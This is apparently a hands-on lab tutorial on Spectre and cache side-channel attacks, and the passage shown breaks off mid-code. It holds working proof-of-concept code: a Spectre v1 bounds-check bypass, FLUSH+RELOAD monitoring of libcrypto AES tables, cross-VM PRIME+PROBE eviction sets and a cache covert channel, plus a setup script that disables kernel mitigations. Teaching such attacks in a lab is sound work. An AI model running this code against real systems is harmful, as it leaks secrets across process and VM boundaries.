# Tutorial: Spectre Variants & Microarchitectural Side Channels — Hands-On Lab

> **Domain 7, Chapter 7A — Lab companion**
> **Scope:** Spectre v1/v2/v3/v4, FLUSH+RELOAD, PRIME+PROBE, cache covert channels, TLB/branch-predictor/port-contention side channels, eBPF speculative leaks, post-2020 attacks (BHI, Retbleed, GDS, Inception, Zenbleed). Mitigations: retpoline, IBRS/eIBRS/IBPB/STIBP, KPTI, SSBD, RSB stuffing, array_index_nospec, SLH, CET-IBT. Detection: performance counters, eBPF monitors, Sigma/YARA rules, forensic timeline.

---

## Lab Environment Setup

### Hardware Requirements

| Component | Minimum | Recommended |
|-----------|---------|-------------|
| CPU (attacker/target) | Intel Skylake+ or AMD Zen 2+ | Intel 10th gen (eIBRS) + older Skylake (no eIBRS) |
| RAM | 8 GB | 16 GB |
| Cores | 4 (2 physical + HT) | 8 (4 physical + HT) |
| Storage | 50 GB | 100 GB SSD |
| Nested Virt | Required for VM exercises | — |

**Ideal dual-CPU setup:** One machine with Skylake (vulnerable to Meltdown, no eIBRS) and one with Ice Lake+ (not affected by Meltdown, has eIBRS) to compare mitigation states.

### VM Topology

```
┌─────────────────────────────────────────────────────────────────────┐
│                        HOST (KVM/QEMU)                               │
│   ┌───────────────────┐  ┌───────────────────┐  ┌────────────────┐ │
│   │  spectre-attack    │  │  spectre-target    │  │ spectre-detect │ │
│   │  (Ubuntu 24.04)    │  │  (Ubuntu 22.04)    │  │ (Ubuntu 24.04) │ │
│   │  Attacker tooling  │  │  Vuln kernel 5.4   │  │ Detection eng  │ │
│   │  gcc/clang, perf   │  │  mitigations=off   │  │ eBPF, Sigma    │ │
│   │  2 vCPU, 4GB       │  │  2 vCPU, 4GB       │  │ 2 vCPU, 4GB   │ │
│   │  SMT sibling pair  │  │  SMT sibling pair  │  │ Dedicated core │ │
│   └───────────────────┘  └───────────────────┘  └────────────────┘ │
│                                                                       │
│   Shared LLC (L3) visible across VMs on same physical package         │
└─────────────────────────────────────────────────────────────────────┘
```

### Installation Script

```bash
#!/bin/bash
# setup_spectre_lab.sh — Provision all three VMs for Spectre/side-channel lab
set -euo pipefail

ROLE="${1:-attack}"  # attack | target | detect

install_common() {
    apt-get update && apt-get install -y \
        build-essential gcc g++ clang llvm \
        linux-tools-common linux-tools-generic \
        linux-headers-$(uname -r) \
        nasm yasm \
        git curl wget \
        python3 python3-pip python3-venv \
        libssl-dev libelf-dev \
        msr-tools cpuid hwloc numactl \
        bpfcc-tools bpftrace libbpf-dev \
        jq bc gnuplot

    pip3 install --break-system-packages numpy scipy matplotlib

    # spectre-meltdown-checker
    if [ ! -f /usr/local/bin/spectre-meltdown-checker.sh ]; then
        wget -qO /usr/local/bin/spectre-meltdown-checker.sh \
            https://raw.githubusercontent.com/speed47/spectre-meltdown-checker/master/spectre-meltdown-checker.sh
        chmod +x /usr/local/bin/spectre-meltdown-checker.sh
    fi
}

install_attack() {
    install_common

    # Mastik side-channel toolkit
    if [ ! -d /opt/mastik ]; then
        git clone https://github.com/0xADE1A1DE/Mastik /opt/mastik
        cd /opt/mastik && ./configure && make
    fi

    # safeside — Google's speculative execution PoC collection
    if [ ! -d /opt/safeside ]; then
        git clone https://github.com/google/safeside /opt/safeside
        cd /opt/safeside && mkdir -p build && cd build && cmake .. && make -j$(nproc)
    fi

    # Flush+Reload lab directory
    mkdir -p /opt/spectre-lab/{spectre_v1,spectre_v2,meltdown,cache_timing,covert_channel,ebpf_spectre}

    # Enable rdtsc for user-space timing
    echo 0 > /proc/sys/kernel/perf_event_paranoid 2>/dev/null || true

    # Load msr module for MSR reads
    modprobe msr

    echo "[+] Attack VM setup complete"
}

install_target() {
    install_common

    # Boot configuration for vulnerable kernel (mitigations disabled)
    if ! grep -q "mitigations=off" /etc/default/grub; then
        sed -i 's/GRUB_CMDLINE_LINUX_DEFAULT="\(.*\)"/GRUB_CMDLINE_LINUX_DEFAULT="\1 mitigations=off"/' \
            /etc/default/grub
        update-grub
        echo "[!] GRUB updated with mitigations=off — REBOOT REQUIRED"
    fi

    # Shared library for cross-process Flush+Reload demo
    cat > /tmp/shared_target.c << 'EOF'
#include <stdio.h>
#include <string.h>
#include <unistd.h>

static char secret[] = "SPECTRE_LAB_SECRET_KEY_12345";

void process_input(int index) {
    // Vulnerable bounds-check pattern
    static char buffer[64];
    if (index >= 0 && index < 64) {
        buffer[index] = secret[index % sizeof(secret)];
    }
}

int main(void) {
    printf("[target] PID=%d running. Secret at %p\n", getpid(), secret);
    while (1) {
        for (int i = 0; i < 64; i++) process_input(i);
        usleep(100);
    }
}
EOF
    gcc -O1 -shared -fPIC -o /usr/lib/libshared_target.so /tmp/shared_target.c
    gcc -O1 -o /opt/target_process /tmp/shared_target.c
    rm /tmp/shared_target.c

    echo "[+] Target VM setup complete"
}

install_detect() {
    install_common

    # Tetragon (Cilium eBPF security observability)
    if ! command -v tetragon &>/dev/null; then
        curl -sL https://github.com/cilium/tetragon/releases/latest/download/tetragon-linux-amd64.tar.gz | \
            tar -xz -C /usr/local/bin/
    fi

    # Falco
    if ! command -v falco &>/dev/null; then
        curl -fsSL https://falco.org/repo/falcosecurity-packages.asc | \
            gpg --dearmor -o /usr/share/keyrings/falco-archive-keyring.gpg
        echo "deb [signed-by=/usr/share/keyrings/falco-archive-keyring.gpg] https://download.falco.org/packages/deb stable main" > \
            /etc/apt/sources.list.d/falcosecurity.list
        apt-get update && apt-get install -y falco
    fi

    # YARA
    apt-get install -y yara

    # Detection rules directory
    mkdir -p /opt/spectre-detect/{sigma,yara,ebpf,forensics}

    echo "[+] Detect VM setup complete"
}

case "$ROLE" in
    attack)  install_attack ;;
    target)  install_target ;;
    detect)  install_detect ;;
    *)       echo "Usage: $0 {attack|target|detect}"; exit 1 ;;
esac
```

### Custom Kernel Boot (mitigations=off for target VM)

```bash
# On spectre-target VM, verify mitigations are disabled:
cat /proc/cmdline | grep mitigations
# Expected: mitigations=off

# Verify all vulnerabilities show "Vulnerable":
for f in /sys/devices/system/cpu/vulnerabilities/*; do
    printf "%-35s %s\n" "$(basename $f)" "$(cat $f)"
done
# Expected: spectre_v1 = Vulnerable, spectre_v2 = Vulnerable, etc.
```

---

## PART A: OFFENSIVE (Attack Scenarios)

### Exercise 1: Spectre v1 — Bounds Check Bypass with FLUSH+RELOAD

**Objective:** Demonstrate speculative out-of-bounds array read via PHT mistraining, recovering secret data byte-by-byte using cache timing.

**Step 1 — Build the Spectre v1 PoC:**

```c
/* spectre_v1_lab.c — Complete Spectre v1 bounds-check bypass
 * Demonstrates: PHT training, speculative OOB read, FLUSH+RELOAD recovery
 * Build: gcc -O1 -march=native -o spectre_v1 spectre_v1_lab.c
 * IMPORTANT: -O1 preserves the speculative gadget; -O2+ may optimize it away
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>
#include <time.h>

/* === Configuration === */
#define CACHE_HIT_THRESHOLD  80   /* cycles; calibrate per CPU */
#define PROBE_STRIDE         512  /* bytes between probe array elements */
#define TRAINING_ROUNDS      30   /* iterations per byte attempt */
#define MAX_ATTEMPTS         999  /* max attempts per byte */

/* === Global state === */
unsigned int array1_size = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};

/* Probe array — each element on separate cache line (512B stride) */
uint8_t array2[256 * PROBE_STRIDE];

/* The secret we want to leak via speculative execution */
char *secret = "TOP_SECRET: Spectre_v1_demonstrates_bounds_check_bypass_2024!";

uint8_t temp = 0;  /* prevent dead-code elimination */

/* === Victim function with speculative gadget === */
void victim_function(size_t x) {
    if (x < array1_size) {
        /* On misprediction: x is out-of-bounds, reads secret byte.
         * The multiplication by PROBE_STRIDE ensures each secret byte value
         * maps to a distinct cache line in array2. */
        temp &= array2[array1[x] * PROBE_STRIDE];
    }
}

/* === Auto-calibrate cache hit threshold === */
int calibrate_threshold(void) {
    volatile uint8_t *p = &array2[0];
    uint64_t hit_total = 0, miss_total = 0;
    unsigned int junk;

    for (int i = 0; i < 1000; i++) {
        /* Measure cache hit */
        (void)*p;  /* ensure cached */
        _mm_mfence();
        uint64_t t0 = __rdtscp(&junk);
        (void)*p;
        hit_total += __rdtscp(&junk) - t0;

        /* Measure cache miss */
        _mm_clflush((void *)p);
        _mm_mfence();
        t0 = __rdtscp(&junk);
        (void)*p;
        miss_total += __rdtscp(&junk) - t0;
    }

    int hit_avg = (int)(hit_total / 1000);
    int miss_avg = (int)(miss_total / 1000);
    int threshold = (hit_avg + miss_avg) / 2;

    printf("[*] Calibration: hit_avg=%d cycles, miss_avg=%d cycles, threshold=%d\n",
           hit_avg, miss_avg, threshold);
    return threshold;
}

/* === Read one byte via Spectre v1 === */
void read_byte_spectre(size_t malicious_x, uint8_t *value, int *score,
                       int threshold) {
    static int results[256];
    int tries, i, j, mix_i;
    unsigned int junk = 0;
    size_t training_x, x;
    volatile uint8_t *addr;

    memset(results, 0, sizeof(results));

    for (tries = 0; tries < MAX_ATTEMPTS; tries++) {
        /* Step 1: Flush probe array from all cache levels */
        for (i = 0; i < 256; i++)
            _mm_clflush(&array2[i * PROBE_STRIDE]);

        /* Step 2: Flush array1_size to widen speculation window
         * When array1_size is not in cache, the branch condition takes
         * 200+ cycles to resolve, giving hundreds of speculative
         * micro-ops time to execute the gadget */
        _mm_clflush(&array1_size);
        _mm_mfence();

        /* Step 3: Train PHT then attack
         * Pattern: 5 in-bounds calls (train PHT as "taken"),
         *          1 out-of-bounds call (speculative OOB read)
         * Repeat 5 times = 30 total iterations */
        training_x = tries % array1_size;
        for (j = TRAINING_ROUNDS - 1; j >= 0; j--) {
            _mm_clflush(&array1_size);
            /* Delay to ensure flush propagates */
            for (volatile int z = 0; z < 100; z++) {}

            /* Branchless selection: x=training_x when j%6!=0,
             * x=malicious_x when j%6==0 */
            x = ((j % 6) - 1) & ~0xFFFF;
            x = (x | (x >> 16));
            x = training_x ^ (x & (malicious_x ^ training_x));

            victim_function(x);
        }

        /* Step 4: Probe array2 — determine which cache line is hot */
        for (i = 0; i < 256; i++) {
            /* Randomize probe order to avoid prefetcher interference */
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * PROBE_STRIDE];

            uint64_t t0 = __rdtscp(&junk);
            junk = *addr;
            uint64_t delta = __rdtscp(&junk) - t0;

            if ((int)delta <= threshold && mix_i != array1[training_x])
                results[mix_i]++;
        }

        /* Check if we have a clear winner */
        j = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] > results[j]) j = i;
        }
        if (results[j] >= (3 * tries / 256)) break;
    }

    *value = (uint8_t)j;
    *score = results[j];
}

int main(int argc, char **argv) {
    printf("=== Spectre v1 Bounds Check Bypass Lab ===\n\n");

    /* Calculate offset from array1 to secret */
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int len = strlen(secret);
    uint8_t value;
    int score;

    printf("[*] Secret address: %p\n", (void *)secret);
    printf("[*] array1 address: %p\n", (void *)array1);
    printf("[*] Offset (malicious_x): %zu (0x%zx)\n", malicious_x, malicious_x);
    printf("[*] Reading %d bytes speculatively...\n\n", len);

    /* Auto-calibrate timing threshold */
    int threshold = calibrate_threshold();
    printf("\n");

    /* Leak secret byte-by-byte */
    int success = 0;
    struct timespec start, end;
    clock_gettime(CLOCK_MONOTONIC, &start);

    for (int i = 0; i < len; i++) {
        read_byte_spectre(malicious_x + i, &value, &score, threshold);
        char display = (value > 31 && value < 127) ? value : '?';
        printf("  Byte[%02d]: 0x%02X = '%c'  (confidence: %d)\n",
               i, value, display, score);
        if (value == (uint8_t)secret[i]) success++;
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) +
                     (end.tv_nsec - start.tv_nsec) / 1e9;

    printf("\n[*] Results: %d/%d bytes correct (%.1f%%)\n", success, len,
           100.0 * success / len);
    printf("[*] Elapsed: %.2f seconds (%.0f bytes/sec)\n", elapsed, len / elapsed);
    printf("[*] Expected: %s\n", secret);

    return (success >= len * 0.9) ? 0 : 1;
}
```

**Step 2 — Compile and run:**

```bash
cd /opt/spectre-lab/spectre_v1

# Save the source
cat > spectre_v1_lab.c << 'PASTE_SOURCE_ABOVE'
# (paste source above)
PASTE_SOURCE_ABOVE

# Compile — O1 is critical (O2+ may eliminate the gadget)
gcc -O1 -march=native -o spectre_v1 spectre_v1_lab.c

# Run on target VM (mitigations=off)
./spectre_v1
```

**Expected output (mitigations=off):**

```
=== Spectre v1 Bounds Check Bypass Lab ===

[*] Secret address: 0x404060
[*] array1 address: 0x404100
[*] Offset (malicious_x): 18446744073709551456 (0xffffffffffffff60)
[*] Reading 62 bytes speculatively...

[*] Calibration: hit_avg=28 cycles, miss_avg=186 cycles, threshold=107

  Byte[00]: 0x54 = 'T'  (confidence: 15)
  Byte[01]: 0x4F = 'O'  (confidence: 12)
  Byte[02]: 0x50 = 'P'  (confidence: 14)
  Byte[03]: 0x5F = '_'  (confidence: 11)
  ...

[*] Results: 60/62 bytes correct (96.8%)
[*] Elapsed: 4.23 seconds (15 bytes/sec)
```

**Step 3 — Verify mitigation effectiveness:**

```bash
# Reboot target VM WITH mitigations:
# In GRUB: remove "mitigations=off", add "spectre_v1=on"
# Then re-run — should fail or produce garbage

# Alternative: test with lfence manually inserted
gcc -O1 -march=native -mno-sse -DLFENCE_AFTER_BRANCH -o spectre_v1_mitigated spectre_v1_lab.c
# (Would need source modification to insert lfence — see Exercise 9)
```

**Verification checklist:**
- [ ] Auto-calibration reports hit/miss differential >50 cycles
- [ ] >90% byte recovery on unmitigated kernel
- [ ] <10% byte recovery on mitigated kernel (array_index_nospec active)
- [ ] Understand why `-O1` is critical (higher optimization reorders or eliminates speculative path)

---

### Exercise 2: FLUSH+RELOAD Cache Timing Primitives

**Objective:** Build production-quality cache timing measurement primitives with auto-calibration, noise filtering, and statistical confidence.

**Step 1 — Core timing library:**

```c
/* cache_timing.h — Portable cache timing primitives
 * Provides: flush, timed_access, calibrate, probe
 */
#ifndef CACHE_TIMING_H
#define CACHE_TIMING_H

#include <stdint.h>
#include <x86intrin.h>
#include <string.h>

typedef struct {
    int hit_threshold;    /* cycles below this = cache hit */
    int miss_min;         /* minimum observed miss latency */
    int hit_max;          /* maximum observed hit latency */
    int noise_floor;      /* standard deviation of hit measurements */
} cache_calibration_t;

static inline void cache_flush(void *addr) {
    _mm_clflush(addr);
    _mm_mfence();
}

static inline uint64_t timed_access(volatile void *addr) {
    unsigned int aux;
    _mm_mfence();
    uint64_t t0 = __rdtscp(&aux);
    asm volatile("" ::: "memory");
    (void)*(volatile uint8_t *)addr;
    uint64_t t1 = __rdtscp(&aux);
    return t1 - t0;
}

static inline cache_calibration_t calibrate_cache(void *buf, int samples) {
    cache_calibration_t cal = {0};
    volatile uint8_t *p = (volatile uint8_t *)buf;
    uint64_t hits[2048], misses[2048];
    int n = (samples > 2048) ? 2048 : samples;

    for (int i = 0; i < n; i++) {
        /* Measure hit */
        (void)*p;
        _mm_mfence();
        hits[i] = timed_access(p);

        /* Measure miss */
        cache_flush((void *)p);
        misses[i] = timed_access(p);
    }

    /* Sort both arrays for robust statistics */
    for (int i = 0; i < n - 1; i++)
        for (int j = i + 1; j < n; j++) {
            if (hits[i] > hits[j]) { uint64_t t = hits[i]; hits[i] = hits[j]; hits[j] = t; }
            if (misses[i] > misses[j]) { uint64_t t = misses[i]; misses[i] = misses[j]; misses[j] = t; }
        }

    /* Use median (robust against outliers) */
    uint64_t hit_median = hits[n / 2];
    uint64_t miss_median = misses[n / 2];

    /* Threshold = midpoint between p95 hit and p5 miss */
    cal.hit_max = (int)hits[(int)(n * 0.95)];
    cal.miss_min = (int)misses[(int)(n * 0.05)];
    cal.hit_threshold = (cal.hit_max + cal.miss_min) / 2;

    /* Noise floor = IQR of hits */
    cal.noise_floor = (int)(hits[(int)(n * 0.75)] - hits[(int)(n * 0.25)]);

    return cal;
}

/* Probe 256 cache lines and record which are hot (cache hits) */
static inline void probe_256(uint8_t *probe_array, int stride,
                             int threshold, int results[256]) {
    for (int i = 0; i < 256; i++) {
        /* Randomize probe order to defeat hardware prefetcher */
        int idx = ((i * 167) + 13) & 0xFF;
        volatile uint8_t *addr = &probe_array[idx * stride];
        uint64_t t = timed_access(addr);
        if ((int)t < threshold) results[idx]++;
    }
}

/* Flush 256 probe lines */
static inline void flush_probe_array(uint8_t *probe_array, int stride) {
    for (int i = 0; i < 256; i++)
        cache_flush(&probe_array[i * stride]);
    _mm_mfence();
}

#endif /* CACHE_TIMING_H */
```

**Step 2 — Demonstrate FLUSH+RELOAD on shared library:**

```c
/* flush_reload_demo.c — Monitor shared library access patterns
 * Demonstrates: cross-process cache observation via shared pages
 * Build: gcc -O2 -o flush_reload_demo flush_reload_demo.c -lrt
 * Run: ./flush_reload_demo /usr/lib/x86_64-linux-gnu/libcrypto.so 0x1a3400
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include "cache_timing.h"

#define SAMPLE_INTERVAL_US  10
#define TOTAL_SAMPLES       10000

int main(int argc, char **argv) {
    if (argc < 3) {
        fprintf(stderr, "Usage: %s <shared_lib_path> <hex_offset>\n", argv[0]);
        return 1;
    }

    const char *lib_path = argv[1];
    size_t offset = strtoul(argv[2], NULL, 16);

    /* Memory-map the shared library (read-only, shared) */
    int fd = open(lib_path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    struct stat st;
    fstat(fd, &st);

    void *base = mmap(NULL, st.st_size, PROT_READ, MAP_SHARED, fd, 0);
    if (base == MAP_FAILED) { perror("mmap"); return 1; }
    close(fd);

    volatile uint8_t *target = (volatile uint8_t *)base + offset;
    printf("[*] Monitoring %s + 0x%zx (%p)\n", lib_path, offset, (void *)target);

    /* Calibrate */
    cache_calibration_t cal = calibrate_cache((void *)target, 1000);
    printf("[*] Threshold: %d cycles (hit_max=%d, miss_min=%d)\n",
           cal.hit_threshold, cal.hit_max, cal.miss_min);

    /* Monitor loop */
    int hits = 0, total = 0;
    printf("[*] Sampling %d times at %d us interval...\n\n", TOTAL_SAMPLES, SAMPLE_INTERVAL_US);

    struct timespec ts_start;
    clock_gettime(CLOCK_MONOTONIC, &ts_start);

    for (int i = 0; i < TOTAL_SAMPLES; i++) {
        cache_flush((void *)target);
        usleep(SAMPLE_INTERVAL_US);

        uint64_t t = timed_access(target);
        int is_hit = ((int)t < cal.hit_threshold);
        if (is_hit) hits++;
        total++;

        /* Print activity bursts */
        if (is_hit && (i % 100 == 0 || i < 20)) {
            printf("  [%06d] CACHE HIT (%lu cycles) — target was accessed\n",
                   i, (unsigned long)t);
        }
    }

    struct timespec ts_end;
    clock_gettime(CLOCK_MONOTONIC, &ts_end);
    double elapsed = (ts_end.tv_sec - ts_start.tv_sec) +
                     (ts_end.tv_nsec - ts_start.tv_nsec) / 1e9;

    printf("\n[*] Results: %d hits / %d samples (%.1f%% activity rate)\n",
           hits, total, 100.0 * hits / total);
    printf("[*] Duration: %.2f seconds\n", elapsed);

    munmap(base, st.st_size);
    return 0;
}
```

**Step 3 — Run against a target process:**

```bash
# Terminal 1: start target process (uses libcrypto for AES)
openssl speed aes-256-cbc &
TARGET_PID=$!

# Terminal 2: monitor libcrypto AES T-table offset
# Find AES T-table offset in libcrypto:
nm -D /usr/lib/x86_64-linux-gnu/libcrypto.so | grep -i "AES_Te\|AES_Td"
# Use one of the returned offsets

./flush_reload_demo /usr/lib/x86_64-linux-gnu/libcrypto.so 0x1a3400

# Expected: high hit rate during AES computation,
# confirming cross-process cache observation
```

**Verification:**
- [ ] Calibration produces hit/miss differential >50 cycles
- [ ] Hit rate >0% when target is active (proving shared-page observation works)
- [ ] Hit rate ~0% when target is idle
- [ ] Understand: this works because physically-shared pages (MAP_SHARED) mean both processes use same cache lines

---

### Exercise 3: PRIME+PROBE on LLC (No Shared Memory)

**Objective:** Build and demonstrate a PRIME+PROBE attack against the Last-Level Cache without requiring shared memory — applicable across VM boundaries.

**Step 1 — Eviction set construction:**

```c
/* eviction_set.c — Construct minimal eviction sets for LLC Prime+Probe
 * Build: gcc -O2 -march=native -o eviction_set eviction_set.c
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/mman.h>
#include <x86intrin.h>

#define LLC_WAYS        16      /* Typical LLC associativity */
#define CACHE_LINE_SIZE 64
#define PAGE_SIZE       4096
#define POOL_SIZE       4096    /* Initial candidate pool size */
#define THRESHOLD       150     /* LLC miss threshold (cycles) */
#define EVICT_ATTEMPTS  5       /* Repeated traversals for reliable eviction */

typedef struct eviction_set {
    volatile uint8_t *addrs[LLC_WAYS];
    int count;
} eviction_set_t;

/* Test if a set of addresses can evict target from LLC */
static int test_eviction(volatile uint8_t **set, int n,
                         volatile uint8_t *target, int attempts) {
    unsigned int aux;
    int evicted = 0;

    for (int a = 0; a < attempts; a++) {
        /* Load target into cache */
        (void)*target;
        _mm_mfence();

        /* Access all set members (eviction) */
        for (int i = 0; i < n; i++) (void)*set[i];
        _mm_mfence();

        /* Time target access */
        uint64_t t0 = __rdtscp(&aux);
        (void)*target;
        uint64_t dt = __rdtscp(&aux) - t0;

        if ((int)dt > THRESHOLD) evicted++;
    }
    /* Require majority of attempts to show eviction */
    return (evicted > attempts / 2);
}

/* Reduce pool to minimal eviction set using group-testing O(n) algorithm */
int find_minimal_eviction_set(volatile uint8_t **pool, int pool_size,
                              volatile uint8_t *target,
                              eviction_set_t *result) {
    /* First verify the full pool can evict */
    if (!test_eviction(pool, pool_size, target, EVICT_ATTEMPTS)) {
        fprintf(stderr, "[-] Full pool cannot evict target — increase pool size\n");
        return -1;
    }

    int wsize = pool_size;
    int found = 0;

    /* Iteratively find essential members */
    for (int i = 0; i < wsize && found < LLC_WAYS;) {
        /* Try removing candidate i */
        volatile uint8_t *saved = pool[i];
        pool[i] = pool[wsize - 1];
        wsize--;

        if (!test_eviction(pool, wsize, target, EVICT_ATTEMPTS)) {
            /* Removing broke eviction — this member is essential */
            pool[wsize] = pool[i];
            pool[i] = saved;
            wsize++;
            result->addrs[found++] = saved;

            /* Permanently remove from working set */
            pool[i] = pool[wsize - 1];
            wsize--;
        }
        /* If still evicts without it, candidate was redundant — leave removed */
        i++;
    }

    result->count = found;
    return found;
}

int main(void) {
    printf("=== LLC Eviction Set Construction ===\n\n");

    /* Allocate large pool of candidate addresses */
    size_t alloc_size = POOL_SIZE * PAGE_SIZE;
    uint8_t *pool_mem = mmap(NULL, alloc_size, PROT_READ | PROT_WRITE,
                             MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
    if (pool_mem == MAP_FAILED) { perror("mmap"); return 1; }

    /* Target address — could be any address we want to monitor */
    volatile uint8_t *target = (volatile uint8_t *)pool_mem;
    printf("[*] Target address: %p\n", (void *)target);

    /* Build candidate pool (same cache-set candidates via page coloring) */
    volatile uint8_t *candidates[POOL_SIZE];
    int n_candidates = 0;

    /* Use addresses at same offset within page (same cache set index bits) */
    size_t target_offset = (size_t)target % PAGE_SIZE;
    for (int i = 1; i < POOL_SIZE && n_candidates < POOL_SIZE; i++) {
        volatile uint8_t *cand = pool_mem + i * PAGE_SIZE + (target_offset % CACHE_LINE_SIZE);
        candidates[n_candidates++] = cand;
    }

    printf("[*] Built candidate pool: %d addresses\n", n_candidates);
    printf("[*] Finding minimal eviction set (LLC_WAYS=%d)...\n", LLC_WAYS);

    eviction_set_t es = {0};
    int found = find_minimal_eviction_set(candidates, n_candidates, target, &es);

    if (found >= LLC_WAYS) {
        printf("[+] Success! Found %d-way eviction set:\n", found);
        for (int i = 0; i < found; i++)
            printf("    [%02d] %p\n", i, (void *)es.addrs[i]);

        /* Verify: prime, wait, probe */
        printf("\n[*] Verification — Prime+Probe cycle:\n");
        for (int trial = 0; trial < 5; trial++) {
            /* Prime */
            for (int w = 0; w < es.count; w++) (void)*es.addrs[w];
            _mm_mfence();

            /* Simulate victim access (or not) */
            if (trial % 2 == 0) (void)*target;  /* victim touches target */
            _mm_mfence();

            /* Probe */
            unsigned int aux;
            int evicted = 0;
            for (int w = 0; w < es.count; w++) {
                uint64_t t0 = __rdtscp(&aux);
                (void)*es.addrs[w];
                uint64_t dt = __rdtscp(&aux) - t0;
                if ((int)dt > THRESHOLD) evicted++;
            }
            printf("    Trial %d: %s (evicted=%d/%d)\n",
                   trial, (trial % 2 == 0) ? "VICTIM ACCESSED" : "no access",
                   evicted, es.count);
        }
    } else {
        printf("[-] Failed: only found %d/%d ways\n", found, LLC_WAYS);
    }

    munmap(pool_mem, alloc_size);
    return 0;
}
```

**Step 2 — Build and run:**

```bash
cd /opt/spectre-lab/cache_timing
gcc -O2 -march=native -o eviction_set eviction_set.c
./eviction_set
```

**Expected output:**

```
=== LLC Eviction Set Construction ===

[*] Target address: 0x7f8a4c000000
[*] Built candidate pool: 4095 addresses
[*] Finding minimal eviction set (LLC_WAYS=16)...
[+] Success! Found 16-way eviction set:
    [00] 0x7f8a4c001000
    [01] 0x7f8a4c010000
    ...
    [15] 0x7f8a4c0f0000

[*] Verification — Prime+Probe cycle:
    Trial 0: VICTIM ACCESSED (evicted=3/16)
    Trial 1: no access (evicted=0/16)
    Trial 2: VICTIM ACCESSED (evicted=4/16)
    Trial 3: no access (evicted=0/16)
    Trial 4: VICTIM ACCESSED (evicted=3/16)
```

**Verification:**
- [ ] Eviction set construction completes (finds LLC_WAYS members)
- [ ] Probe detects victim access (evicted > 0 when victim touches target)
- [ ] Probe shows no eviction when victim is idle
- [ ] Understand: this works without shared memory — applicable cross-VM

---

### Exercise 4: Cache Covert Channel

**Objective:** Build a sender/receiver pair communicating via cache state, demonstrating cross-process data exfiltration through the cache hierarchy.

**Step 1 — Covert channel implementation:**

```c
/* covert_channel.c — Flush+Reload covert channel sender/receiver
 * Build: gcc -O2 -march=native -o covert_channel covert_channel.c -lpthread -lrt
 * Run: ./covert_channel [send|recv]
 */
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <time.h>
#include <x86intrin.h>

#define SHM_NAME        "/spectre_lab_covert"
#define SHM_SIZE        4096
#define BIT_WINDOW_NS   5000     /* 5 microseconds per bit */
#define SYNC_MAGIC      0xDEADBEEF
#define THRESHOLD       100

/* Shared memory layout:
 * [0]    = sync word (SYNC_MAGIC when ready)
 * [64]   = data channel (cache line)
 * [128]  = clock channel (sender signals bit start)
 */

static inline uint64_t rdtscp_time(void) {
    unsigned int aux;
    return __rdtscp(&aux);
}

/* === SENDER === */
void sender_main(const char *message) {
    /* Create shared memory */
    int fd = shm_open(SHM_NAME, O_CREAT | O_RDWR, 0666);
    ftruncate(fd, SHM_SIZE);
    volatile uint8_t *shm = mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE,
                                  MAP_SHARED, fd, 0);
    close(fd);

    /* Signal ready */
    *(volatile uint32_t *)shm = SYNC_MAGIC;
    printf("[SENDER] Ready. Shared memory at %p\n", (void *)shm);
    printf("[SENDER] Sending: \"%s\" (%zu bytes)\n", message, strlen(message));

    /* Wait for receiver */
    usleep(500000);

    volatile uint8_t *data_line = &shm[64];
    int total_bits = 0;
    struct timespec start;
    clock_gettime(CLOCK_MONOTONIC, &start);

    /* Send length first (16-bit) */
    uint16_t len = strlen(message);
    for (int b = 15; b >= 0; b--) {
        int bit = (len >> b) & 1;
        if (bit) {
            (void)*data_line;   /* Load = '1' (bring into cache) */
        } else {
            _mm_clflush((void *)data_line);  /* Flush = '0' */
            _mm_mfence();
        }
        /* Timing window */
        uint64_t deadline = rdtscp_time() + BIT_WINDOW_NS * 3;  /* ~5us at 3GHz */
        while (rdtscp_time() < deadline) {}
        total_bits++;
    }

    /* Send message bytes */
    for (size_t i = 0; i < len; i++) {
        uint8_t byte = message[i];
        for (int b = 7; b >= 0; b--) {
            int bit = (byte >> b) & 1;
            if (bit) {
                (void)*data_line;
            } else {
                _mm_clflush((void *)data_line);
                _mm_mfence();
            }
            uint64_t deadline = rdtscp_time() + BIT_WINDOW_NS * 3;
            while (rdtscp_time() < deadline) {}
            total_bits++;
        }
    }

    struct timespec end;
    clock_gettime(CLOCK_MONOTONIC, &end);
    double elapsed = (end.tv_sec - start.tv_sec) +
                     (end.tv_nsec - start.tv_nsec) / 1e9;

    printf("[SENDER] Sent %d bits in %.3f seconds (%.0f bps)\n",
           total_bits, elapsed, total_bits / elapsed);

    /* Cleanup */
    munmap((void *)shm, SHM_SIZE);
}

/* === RECEIVER === */
void receiver_main(void) {
    /* Open shared memory */
    int fd = shm_open(SHM_NAME, O_RDWR, 0666);
    if (fd < 0) { perror("shm_open (is sender running?)"); return; }
    volatile uint8_t *shm = mmap(NULL, SHM_SIZE, PROT_READ | PROT_WRITE,
                                  MAP_SHARED, fd, 0);
    close(fd);

    /* Wait for sender ready */
    printf("[RECEIVER] Waiting for sender...\n");
    while (*(volatile uint32_t *)shm != SYNC_MAGIC) usleep(1000);
    printf("[RECEIVER] Sender detected. Receiving...\n");

    volatile uint8_t *data_line = &shm[64];
    int errors = 0;

    /* Receive length (16-bit) */
    uint16_t len = 0;
    for (int b = 15; b >= 0; b--) {
        _mm_clflush((void *)data_line);
        _mm_mfence();

        uint64_t deadline = rdtscp_time() + BIT_WINDOW_NS * 3;
        while (rdtscp_time() < deadline) {}

        /* Probe: hit = sender loaded it = '1' */
        unsigned int aux;
        uint64_t t0 = __rdtscp(&aux);
        (void)*data_line;
        uint64_t dt = __rdtscp(&aux) - t0;

        int bit = ((int)dt < THRESHOLD) ? 1 : 0;
        len |= (bit << b);
    }

